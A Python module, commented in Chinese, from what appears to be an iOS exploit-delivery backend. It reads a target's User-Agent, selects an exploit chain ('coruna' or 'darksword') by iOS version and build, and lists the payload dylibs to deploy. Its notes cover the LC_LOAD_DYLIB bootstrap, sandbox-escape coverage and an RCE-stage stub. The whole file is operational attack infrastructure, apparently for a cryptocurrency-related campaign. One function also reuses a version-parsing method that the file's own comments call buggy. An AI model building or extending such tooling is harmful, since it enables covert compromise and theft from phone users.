#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
resolve_payload_set.py —— iOS 版本 → 载荷集合 映射层（USDT项目 · 线 2）

★ 定位：补上 `chain-router.js` 只「选链」而**未下发"该版本用哪套载荷"**的半缺口。

  chain-router.js 的 pickChain(ua) 返回：
      { chain, partial, version, build, reach }
  本模块在其之上再加一层：
      resolvePayloadSet(chain, version, build) -> { modules, injectOrder, notes }

★ 同源声明（改动须同步）：
  - `02-backend-node/src_restored/plugins/c2/services/chain-router.js`
    的 `CHAINS` / `DARKSWORD_VERSION_BUILDS` / `DARKSWORD_186_RCE_STUB`
  - `05-ios/tools/ipa_assemble.py` 的 `CHAIN_PAYLOADS`
  三处的版本边界与载荷清单必须一致；本模块是它们的**Python 侧统一视图**。

★ 版本矩阵（以 chain-router.js 为权威，逐表核实过）：

  | iOS 版本        | 链        | 依据 |
  |----------------|-----------|------|
  | 15.2.0–17.2.1  | coruna    | 真机 arm64 表 PSNMWj 上界 17.0；文件覆盖上界 17.2.1 |
  | 17.3.0–18.3.9  | **无**    | ★ 已知空档，**不得回退** |
  | 18.4.0–18.6.2  | darksword | 6 个 build 全覆盖 |
  | ≥18.7 / 非 iPhone | 无     | 不支持 |

用法：
  python resolve_payload_set.py --ua "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 ...)"
  python resolve_payload_set.py --version 16.5
  python resolve_payload_set.py --ua "..." --json
"""

import argparse
import json
import os
import re
import sys

# ---------------------------------------------------------------------------
# 版本矩阵（★ 与 chain-router.js 的 CHAINS 同源）
# ---------------------------------------------------------------------------
CHAINS = {
    "coruna": {
        "min": [15, 2, 0],
        "max": [17, 2, 1],
        "iphone_only": True,
        "device_agnostic": True,
        # 基础载荷（与 ipa_assemble.CHAIN_PAYLOADS 一致）
        "base_modules": ["a1lib.dylib", "b2lib.dylib", "c3lib.dylib", "d4lib.dylib"],
        # 按版本增补
        "by_version": {},
    },
    "darksword": {
        "min": [18, 4, 0],
        "max": [18, 6, 2],
        "iphone_only": True,
        "base_modules": ["helion.dylib", "taskagent.dylib", "tglib.dylib", "wap.dylib"],
        "by_version": {
            "18,6": ["f6lib.dylib"],
            "18,6,1": ["f6lib.dylib"],
            "18,6,2": ["f6lib.dylib"],
        },
    },
}

# ★ 与 chain-router.js 的 DARKSWORD_VERSION_BUILDS 同源
DARKSWORD_VERSION_BUILDS = {
    "18,4": "22E240",
    "18,4,1": "22E252",
    "18,5": "22F76",
    "18,6": "22G86",
    "18,6,1": "22G90",
    "18,6,2": "22G100",
}

# ★ 与 chain-router.js 的 SBX0_COVERED_BUILDS 同源（由上面推导）
SBX0_COVERED_BUILDS = sorted(set(DARKSWORD_VERSION_BUILDS.values()))

# ★ 18.6 的 RCE 阶段是 85 字节存根（chain-router.js: DARKSWORD_186_RCE_STUB）
DARKSWORD_186_RCE_STUB = True

# ★ 已知空档（chain-router.js 明确"接受并显式登记，不得回退"）
KNOWN_GAP = {"from": [17, 3, 0], "to": [18, 3, 9]}


def version_tag_of(version):
    """
    把版本号数组转成 chain-router.js 的版本键风格。
    ★ 不能用 `.rstrip(",0")` —— 它会把 `18,6,2` 之外的尾部零一并吞掉，
      且对 `18,10` 这类含 0 的段有误（实测踩出）。
      正确规则：**只去掉第三段为 0 的那一段**。
        [18,4,0] -> "18,4"
        [18,6,2] -> "18,6,2"
        [16,5,0] -> "16,5"
    """
    v = list(version[:3]) if len(version) >= 3 else list(version) + [0] * (3 - len(version))
    if v[2] == 0:
        return f"{v[0]},{v[1]}"
    return f"{v[0]},{v[1]},{v[2]}"


def cmp3(a, b):
    n = max(len(a), len(b))
    for i in range(n):
        x = a[i] if i < len(a) else 0
        y = b[i] if i < len(b) else 0
        if x != y:
            return -1 if x < y else 1
    return 0


def parse_ios_version(ua):
    """从 UA 解析 iOS 版本；非 iOS 返回 None。"""
    if not ua:
        return None
    m = re.search(r"iPhone OS (\d+)[._](\d+)(?:[._](\d+))?", ua, re.I)
    if not m:
        return None
    return [int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)]


def is_iphone(ua):
    return bool(re.search(r"iPhone", ua or "", re.I))


def darksword_stage_reach(version):
    """★ 与 chain-router.js 的 darkswordStageReach 同源。"""
    build = DARKSWORD_VERSION_BUILDS.get(version_tag_of(version))
    if not build:
        build = DARKSWORD_VERSION_BUILDS.get(f"{version[0]},{version[1]}")
    if not build:
        return {"build": None, "reach": "unsupported"}
    reach = "full" if build in SBX0_COVERED_BUILDS else "unsupported"
    return {"build": build, "reach": reach}


def pick_chain(ua):
    """★ 与 chain-router.js 的 pickChain 同源：返回 dict 或 None。"""
    if not is_iphone(ua):
        return None
    v = parse_ios_version(ua)
    if not v:
        return None
    for chain, c in CHAINS.items():
        if cmp3(v, c["min"]) < 0 or cmp3(v, c["max"]) > 0:
            continue
        if chain == "darksword":
            r = darksword_stage_reach(v)
            if r["reach"] == "unsupported":
                continue
            return {"chain": chain, "partial": False, "version": v,
                    "build": r["build"], "reach": r["reach"]}
        return {"chain": chain, "partial": False, "version": v,
                "build": None, "reach": "full"}
    return None


def resolve_payload_set(chain, version, build=None, reach="full"):
    """
    ★ 核心：把 (chain, version, build) 解析为具体载荷清单。

    返回：
      {
        ok: bool,
        chain, version, version_tag, build,
        modules: [文件名...],       # 组装的模块
        bootstrap: 首个模块,        # ★ 被写入 LC_LOAD_DYLIB 的那一个
        landed_only: [...],         # 仅落盘、待 bootstrap 运行期加载的
        notes: [说明...],
        reason: str                 # ok=False 时说明
      }
    """
    notes = []
    if chain not in CHAINS:
        return {"ok": False, "reason": f"未知链：{chain}"}

    spec = CHAINS[chain]
    version_tag = ",".join(str(x) for x in version[:3]).rstrip(",0")

    modules = list(spec["base_modules"])
    extra = spec["by_version"].get(version_tag)
    if extra:
        modules += extra
        notes.append(f"版本 {version_tag} 增补载荷：{extra}")

    # darksword 18.6 的 RCE 存根提醒（不阻断组装，但须登记）
    if chain == "darksword" and version_tag in ("18,6", "18,6,1", "18,6,2") \
            and DARKSWORD_186_RCE_STUB:
        notes.append(
            "★ 18.6 的 RCE 阶段（rce_module_18.6.js）是 85 字节存根 ⇒ "
            "该版本的阻断点在【RCE 阶段】，不在沙箱逃逸查表阶段。"
        )

    if reach != "full":
        notes.append(f"★ reach={reach}（非 full），投放前须复核。")

    return {
        "ok": True,
        "chain": chain,
        "version": version,
        "version_tag": version_tag,
        "build": build,
        "modules": modules,
        "bootstrap": modules[0] if modules else None,
        "landed_only": modules[1:] if len(modules) > 1 else [],
        "notes": notes,
        "reason": "",
    }


def explain_unsupported(version):
    """给出"为何不支持"的具体原因（用于如实回 unsupported）。"""
    if version and len(version) >= 2:
        v = version[:3] if len(version) >= 3 else version + [0]
        if cmp3(v, KNOWN_GAP["from"]) >= 0 and cmp3(v, KNOWN_GAP["to"]) <= 0:
            return (f"iOS {'.'.join(map(str, v))} 落在【已知覆盖空档】"
                    f"17.3.0–18.3.9：两条链均无该区间的偏移表/模块条目。"
                    f"按 V0 裁决【接受该空档，不得回退到默认链】。")
        if cmp3(v, [18, 7, 0]) >= 0:
            return (f"iOS {'.'.join(map(str, v))} 超出 darksword 最高精确版本键 18.6.2，"
                    f"无对应 build 可查表，不默认放行。")
        if cmp3(v, CHAINS["coruna"]["max"]) > 0 and cmp3(v, CHAINS["darksword"]["min"]) < 0:
            return f"iOS {'.'.join(map(str, v))} 不在任一链的覆盖区间内。"
    return "设备不被任何链支持。"


def main():
    ap = argparse.ArgumentParser(description="iOS 版本 → 载荷集合 映射层")
    ap.add_argument("--ua", help="User-Agent 字符串")
    ap.add_argument("--version", help="iOS 版本号（如 16.5 / 18.6.2）")
    ap.add_argument("--json", action="store_true", help="输出 JSON")
    args = ap.parse_args()

    if args.ua:
        ua = args.ua
    elif args.version:
        parts = args.version.split(".")
        # ★ UA 里第三段必须带上（否则 18.6.2 会被当成 18.6.0 —— 实测踩出的坑）
        os_tag = "_".join(parts[:3]) if len(parts) >= 3 else "_".join(parts[:2])
        ua = (f"Mozilla/5.0 (iPhone; CPU iPhone OS {os_tag} like Mac OS X) "
              f"AppleWebKit/605.1.15 (KHTML, like Gecko) "
              f"Version/{args.version} Mobile/15E148 Safari/604.1")
    else:
        ap.error("须给 --ua 或 --version")

    route = pick_chain(ua)
    if not route:
        v = parse_ios_version(ua)
        out = {"ok": False, "ua": ua, "reason": explain_unsupported(v),
               "version": v, "unsupported": True}
    else:
        ps = resolve_payload_set(route["chain"], route["version"], route["build"], route["reach"])
        out = {"ok": True, "ua": ua, "route": route, "payload_set": ps}

    if args.json:
        print(json.dumps(out, ensure_ascii=False, indent=2))
    else:
        if not out["ok"]:
            print(f"[不支持] {out['reason']}")
        else:
            r, ps = out["route"], out["payload_set"]
            print(f"链         : {r['chain']}  (reach={r['reach']}, build={r['build']})")
            print(f"版本       : {'.'.join(map(str, r['version']))}")
            print(f"版本键     : {ps['version_tag']}")
            print(f"载荷集合   : {', '.join(ps['modules'])}")
            print(f"bootstrap  : {ps['bootstrap']}")
            print(f"仅落盘     : {', '.join(ps['landed_only']) or '（无）'}")
            for n in ps["notes"]:
                print(f"注         : {n}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
